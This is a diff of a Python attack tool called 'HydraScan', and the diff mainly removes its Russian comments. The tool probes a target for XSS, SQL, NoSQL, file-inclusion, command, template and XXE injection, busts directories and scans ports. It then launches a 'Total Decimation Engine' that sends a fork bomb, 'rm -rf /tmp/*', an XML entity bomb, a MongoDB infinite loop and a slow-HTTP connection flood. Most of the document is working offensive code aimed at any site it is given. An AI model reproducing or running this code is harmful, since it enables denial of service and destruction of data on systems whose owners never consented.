@@ -13,28 +13,24 @@ import re
 import sys
 import os
 import random
-import zstandard # Добавляем для явного импорта, хотя используется в urllib3
+import zstandard
 
-# --- Настройки ---
-TIMEOUT = 0.8 # Основной агрессивный таймаут
-TIMEOUT_PATH = 1.5 # Увеличенный таймаут для Directory Busting (для стабильности)
-THREAD_COUNT = 100 # Снижено: Умеренная параллельность для DoS (снижение нагрузки на CPU)
+TIMEOUT = 0.8 
+TIMEOUT_PATH = 1.5 
+THREAD_COUNT = 100 
 DEFAULT_PORTS = [21, 22, 23, 80, 443, 3306, 5432, 8080, 8443, 6379, 9200, 27017, 11211, 7001, 8888] 
 HEADERS_TO_TEST = {'User-Agent': 'HydraScan v8.4 (CPU Optimized Annihilation Mode)'}
 
-# --- МАССИВНЫЕ ПЕЙЛОАДЫ (Без изменений) ---
 
-# 1. PARAMETER SPACE (x15)
 INJECTION_PARAMS = ['id', 'page', 'category', 'item', 'q', 'view', 'file', 'username', 'redir', 
                     'post_id', 'lang', 'style', 'path', 'url', 'key', 'name', 'search', 
                     'filter', 'debug', 'action', 'token', 'query', 'source', 'cmd', 'exec']
 
-# 2. RCE & LFI PAYLOADS (x10)
 RCE_DOS_PAYLOADS = [
     "; dd if=/dev/zero of=/dev/null &",
-    "; :(){ :|:& };:", # Fork Bomb (bash) - Самый тяжелый вектор
-    "; mkfifo p; tail -f p | head -c 1000000000 > /dev/null &", # Нагрузка I/O
-    "; rm -rf /tmp/*", # Очистка критических кэшей
+    "; :(){ :|:& };:", 
+    "; mkfifo p; tail -f p | head -c 1000000000 > /dev/null &", 
+    "; rm -rf /tmp/*",
 ]
 LFI_PAYLOADS = [
     "../../../../etc/passwd", "../../../../../proc/self/environ", 
@@ -42,11 +38,9 @@ LFI_PAYLOADS = [
     "../../../../etc/hosts"
 ]
 
-# 3. SQLi & NoSQLi
 SQLI_PAYLOAD_TIME = "1' AND (SELECT 52 FROM (SELECT(SLEEP(5)))a) AND '1'='1"
-NOSQLI_DOS = {'$where': 'while (true) {}'} # MongoDB Loop - Тяжелый вектор
+NOSQLI_DOS = {'$where': 'while (true) {}'} 
 
-# 4. XXE & Hash Collision DoS
 XML_BOMB_PAYLOAD = """
 <?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -61,9 +55,8 @@ XML_BOMB_PAYLOAD = """
   <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 ]>
 <lolz>&lol7;</lolz>
-""" # XML Bomb - Тяжелый вектор
+""" 
 
-# 6. Common Paths
 COMMON_PATHS = [
     "/.git/config", "/.env", "/admin/", "/backup.zip", "/phpinfo.php", 
     "/api/v1/users", "/db_config.php", "/sitemap.xml", "/wp-config.php.bak",
@@ -71,13 +64,9 @@ COMMON_PATHS = [
     "/login", "/register" 
 ]
 
-# --- Инициализация Rich Console ---
 console = Console()
 
 class HydraScan:
-    """
-    Профессиональный инструмент для аудита и деструктивной эксплуатации.
-    """
     def __init__(self, target_url):
         self.target_url = self._normalize_url(target_url)
         self.target_domain = urlparse(self.target_url).netloc
@@ -115,12 +104,10 @@ class HydraScan:
             console.print(f"[bold red]❌ Error:[/bold red] Failed to resolve domain {domain}", file=sys.stderr)
             return None
 
-    ## --- Модуль 4: Massive Injection Bus (Без изменений) ---
     def run_injection_audit(self):
         target_url_base = self.target_url.split('?')[0]
         
         for param in INJECTION_PARAMS: 
-            # 1. XSS (Reflected)
             xss_test_url = f"{target_url_base}?{param}={quote('<script>alert(\"XSS_TEST\")</script>')}"
             try:
                 response = requests.get(xss_test_url, timeout=3, headers=HEADERS_TO_TEST)
@@ -129,7 +116,6 @@ class HydraScan:
                     self.exploitation_opportunities.append(("XSS_REAL", xss_test_url, None, f"XSS found in '{param}'."))
             except requests.exceptions.RequestException: pass
                 
-            # 2. SQLi (Time-Based)
             sqli_test_url_time = f"{target_url_base}?{param}={quote(self.PAYLOADS['SQLI_TIME'])}"
             try:
                 start_time = time.time()
@@ -140,7 +126,6 @@ class HydraScan:
                     self.exploitation_opportunities.append(("SQLi_TIME", sqli_test_url_time, self.PAYLOADS['SQLI_TIME'], f"SQLi (Time-Based) in '{param}'."))
             except requests.exceptions.RequestException: pass
 
-            # 3. LFI (Local File Inclusion)
             lfi_test_url = f"{target_url_base}?{param}={quote(self.PAYLOADS['LFI_PASSWD'])}"
             try:
                 response = requests.get(lfi_test_url, timeout=3, headers=HEADERS_TO_TEST)
@@ -149,7 +134,6 @@ class HydraScan:
                     self.exploitation_opportunities.append(("LFI_REAL", lfi_test_url, self.PAYLOADS['LFI_PASSWD'], f"LFI found in '{param}'."))
             except requests.exceptions.RequestException: pass
             
-            # 4. RCE (Command Injection)
             rce_test_url = f"{target_url_base}?{param}={quote(self.PAYLOADS['RCE_ID'])}"
             try:
                 response = requests.get(rce_test_url, timeout=3, headers=HEADERS_TO_TEST)
@@ -158,7 +142,6 @@ class HydraScan:
                     self.exploitation_opportunities.append(("RCE_REAL", rce_test_url, self.PAYLOADS['RCE_ID'], f"RCE found in '{param}'."))
             except requests.exceptions.RequestException: pass
             
-            # 5. SSTI (Template Injection)
             ssti_test_url = f"{target_url_base}?{param}={quote(self.PAYLOADS['SSTI_CALC'])}"
             try:
                 response = requests.get(ssti_test_url, timeout=3, headers=HEADERS_TO_TEST)
@@ -169,7 +152,6 @@ class HydraScan:
             
         self.total_checks_run += len(INJECTION_PARAMS) * 5
 
-        # 6. XXE Injection
         xxe_test_url = target_url_base
         try:
             xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
@@ -180,7 +162,6 @@ class HydraScan:
         except requests.exceptions.RequestException: pass
         self.total_checks_run += 1
         
-        # 7. NoSQLi DoS Check (If POST is supported)
         if target_url_base.startswith(('http://', 'https://')):
              try:
                  start_time = time.time()
@@ -193,11 +174,9 @@ class HydraScan:
              self.total_checks_run += 1
 
 
-    ## --- Модуль 5: Расширенные Проверки (Без изменений) ---
     def run_advanced_audit(self):
         target_url_base = self.target_url.split('?')[0]
         
-        # 1. Open Redirect & SSRF
         for param in ['redirect', 'next', 'returnUrl', 'url', 'link', 'src']:
             redirect_payload = "https://www.google.com"
             redirect_test_url = f"{target_url_base}?{param}={quote(redirect_payload)}"
@@ -215,7 +194,6 @@ class HydraScan:
                     except requests.exceptions.RequestException: pass
             except requests.exceptions.RequestException: pass
             
-        # 2. CSRF Token Check
         try:
             response = requests.get(self.target_url, timeout=3, headers=HEADERS_TO_TEST)
             if '<form method="post"' in response.text.lower() and 'csrf' not in response.text.lower() and 'token' not in response.text.lower():
@@ -224,19 +202,15 @@ class HydraScan:
         
         self.total_checks_run += 10
 
-    ## --- Модуль 7: Authentication DoS Engine (ОТКЛЮЧЕН для снижения нагрузки на CPU) ---
     def run_auth_dos_audit(self):
-        # Этот модуль отключен для предотвращения 100% загрузки CPU на Вашей машине.
         self.total_checks_run += 0 
         pass
 
-    ## --- Модуль 8: Total Decimation Engine (Без изменений, только отчет) ---
     def launch_attack(self, opportunity):
         vuln_type, target_url, payload, description = opportunity
 
         console.print(f"\n[bold magenta]*** EXPLOIT: {vuln_type} ({description}) ***[/bold magenta]")
         
-        # 1. DESTRUCTIVE COMMAND EXECUTION (RCE/SSTI) - Потенциально ложит сайт
         if vuln_type in ["RCE_REAL", "SSTI_REAL"]:
              console.print("[bold red]💣 DECIMATION ENGINE: RCE/SSTI DoS Attack Activated (Fork Bomb/I/O Load)...[/bold red]")
              rce_dos_payload = random.choice(self.PAYLOADS['RCE_DOS'])
@@ -254,7 +228,6 @@ class HydraScan:
              except requests.exceptions.RequestException as e:
                  console.print(Panel(f"[bold red]❌ FAILED: RCE/SSTI Attack failed. Error: {e.__class__.__name__}.[/bold red]", border_style="red"))
 
-        # 2. XML BOMB DoS (XXE) - Потенциально ложит сайт
         if vuln_type == "XXE_REAL":
             console.print("[bold red]💣 DECIMATION ENGINE: XML Bomb DoS Attack Activated...[/bold red]")
             try:
@@ -265,7 +238,6 @@ class HydraScan:
             except requests.exceptions.RequestException as e:
                 console.print(Panel(f"[bold red]❌ FAILED: XML Bomb Attack failed. Error: {e.__class__.__name__}.[/bold red]", border_style="red"))
                 
-        # 3. NOSQL INJECTION DoS - Потенциально ложит сайт
         if vuln_type == "NOSQLI_DOS":
              console.print("[bold red]💣 DECIMATION ENGINE: NoSQLi DoS Loop Attack Activated...[/bold red]")
              success_count = 0
@@ -281,7 +253,6 @@ class HydraScan:
              else:
                  console.print(Panel(f"[bold red]❌ FAILED: NoSQLi DoS Attack failed to send payload or immediately failed.[/bold red]", border_style="red"))
                 
-        # 4. RESOURCE EXHAUSTION (Persistent Slow DoS) - Высокая нагрузка
         if vuln_type in ["SQLi_TIME", "XSS_REAL", "INFO_LEAK_FILE", "UNIVERSAL_DOS"]: 
              if self.slow_dos_active.is_set():
                  console.print("[bold yellow]⚠️ UNCLEAR: Persistent Slow HTTP DoS already running. Skip redundant launch.[/bold yellow]")
@@ -293,12 +264,10 @@ class HydraScan:
              self.slow_dos_active.set() 
              console.print(Panel(f"[bold green]✅ SUCCESS: Persistent Slow HTTP DoS initiated with {THREAD_COUNT} connections. Проверить нагрузку через 5 минут.[/bold green]", border_style="green"))
 
-        # 5. AUTH DoS (Пропускаем)
         if vuln_type == "AUTH_DOS":
             console.print(Panel(f"[bold yellow]⚠️ UNCLEAR: Login Flood Skipped.[/bold yellow] Модуль отключен для сохранения стабильности Вашего CPU.", border_style="yellow"))
 
 
-        # 6. SQLi Confirmation (Time-based only)
         if vuln_type == "SQLi_TIME":
              try:
                  start_time = time.time()
@@ -322,7 +291,6 @@ class HydraScan:
             pass
 
     def _slow_connection_worker(self):
-        """Рабочий поток с УВЕЛИЧЕННЫМ таймаутом сокета для снижения нагрузки на CPU."""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(20) # Увеличен таймаут сокета
@@ -332,13 +300,11 @@ class HydraScan:
             request_line = f"POST / HTTP/1.1\r\nHost: {self.target_domain}\r\n"
             s.send(request_line.encode('utf-8'))
             
-            # Отправляем заголовки, чтобы занять поток сервера
             for header, value in SLOW_HEADERS_V2.items():
                  s.send(f"{header}: {value}\r\n".encode('utf-8'))
             
             s.send(b'\r\n')
             
-            # Удерживаем соединение
             time.sleep(300) 
             s.close()
             
@@ -347,7 +313,6 @@ class HydraScan:
         except Exception:
             pass 
 
-    ## --- Модуль 1: Аудит Конфигурации и Заголовков (Без изменений) ---
     def _audit_headers(self, response):
         headers = response.headers
         findings = []
@@ -379,7 +344,6 @@ class HydraScan:
         self.total_checks_run += 12
         return findings
 
-    ## --- Модуль 2: Directory Busting & Subdomain Takeover (Без изменений) ---
     def _path_worker(self):
         while not self.q_paths.empty():
             path = self.q_paths.get()
@@ -414,7 +378,6 @@ class HydraScan:
         self.q_paths.join()
         self.total_checks_run += len(self.COMMON_PATHS)
 
-    ## --- Модуль 3: Сканирование Портов (Без изменений) ---
     def _run_port_scan(self):
         open_ports = []
         q = Queue()
@@ -536,7 +499,6 @@ class HydraScan:
         console.print(vuln_table)
         console.print("="*90, style="bold blue")
 
-        # 6. Automatic Exploitation / Decimation
         if self.exploitation_opportunities:
             console.print(Panel(
                 Text(f"CONFIRMED {len(self.exploitation_opportunities)} EXPLOITATION VECTORS. INITIATE TOTAL DECIMATION ENGINE?", justify="center", style="bold white on red"),
@@ -563,7 +525,6 @@ class HydraScan:
                     console.print("[bold yellow]Total Decimation Engine skipped by user command.[/bold yellow]")
 
 
-# --- EXECUTION ---
 
 if __name__ == "__main__":
     os.system('cls' if os.name == 'nt' else 'clear') 
